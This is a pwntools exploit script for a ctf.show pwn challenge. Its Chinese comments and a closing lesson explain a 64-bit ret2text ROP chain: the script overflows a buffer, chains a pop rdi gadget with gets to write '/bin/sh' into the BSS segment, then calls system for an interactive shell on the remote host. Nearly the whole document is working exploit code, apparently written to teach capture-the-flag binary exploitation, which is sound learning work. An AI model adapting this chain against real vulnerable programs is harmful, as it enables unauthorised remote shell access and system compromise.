from pwn import *

p = remote('pwn.challenge.ctf.show', 28259)

# gets_addr = 0x400530：gets函数的地址
# gets函数用于读取输入并写入指定地址，不检查输入长度
gets_addr = 0x400530

# sys_addr = 0x400520：system函数的地址
# 通过IDA分析程序找到的system函数地址
sys_addr = 0x400520

# bss_addr = 0x602081：BSS段的地址
# BSS段用于存储全局变量和静态变量，通常具有可读写权限
# 选择BSS段作为写入"/bin/sh"的目标地址
bss_addr = 0x602081

# pop_rdi = 0x4007f3：pop rdi; ret gadget的地址
# 用于将参数加载到rdi寄存器（64位函数调用第一个参数通过rdi传递）
# 通过ROPgadget --binary=pwn44 grep "pop rdi; ret" 找到
pop_rdi = 0x4007f3

# offset = 0xA + 8：计算64位程序的栈溢出偏移量
# 0xA：缓冲区到saved rbp的距离（通过IDA或cyclic计算）
# 8：saved rbp的大小（64位程序，rbp为8字节）
# 总偏移量 = 0xA + 8 = 0x12，定位到返回地址
offset = 0xA + 8

# payload构造分析：
# b'a' * offset：填充垃圾数据到返回地址位置
# p64(pop_rdi)：执行pop rdi; ret，将下一个值弹出到rdi寄存器
# p64(bss_addr)：被pop到rdi寄存器，作为gets的第一个参数
# p64(gets_addr)：跳转到gets函数执行，读取输入到bss_addr
# p64(pop_rdi)：gets执行完后，再次执行pop rdi; ret
# p64(bss_addr)：被pop到rdi寄存器，作为system的第一个参数
# p64(sys_addr)：跳转到system函数执行，执行system("/bin/sh")
# 注意：原代码中缺少sys_addr，这里应该补充
payload = b'a' * offset + p64(pop_rdi) + p64(bss_addr) + p64(gets_addr) + p64(pop_rdi) + p64(bss_addr) + p64(sys_addr)

p.sendline(payload)  # 发送第一次payload，触发gets调用

p.send('/bin/sh\x00')  # 发送"/bin/sh"字符串，被gets写入BSS段

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 64位 + BSS写入
2. 64位ROP链复杂构造：
   - 需要两次pop_rdi，分别给gets和system传参
3. payload结构分析：
   b'a' * offset        - 填充到返回地址
   + p64(pop_rdi)       - 准备给gets传参
   + p64(bss_addr)      - gets的参数（写入地址）
   + p64(gets_addr)     - 调用gets
   + p64(pop_rdi)       - gets返回后，再次pop_rdi给system传参
   + p64(bss_addr)      - system的参数
   + p64(sys_addr)      - 调用system
4. 执行流程：
   - 跳转到pop_rdi，弹出bss_addr到rdi
   - 跳转到gets，rdi作为参数，等待输入
   - 输入"/bin/sh"，写入bss_addr
   - gets返回，再次pop_rdi，弹出bss_addr到rdi
   - 跳转到system，rdi作为参数，获得shell
5. 64位调用约定：
   - 第一个参数通过rdi寄存器传递
   - 需要使用ROP gadget来设置寄存器值
"""
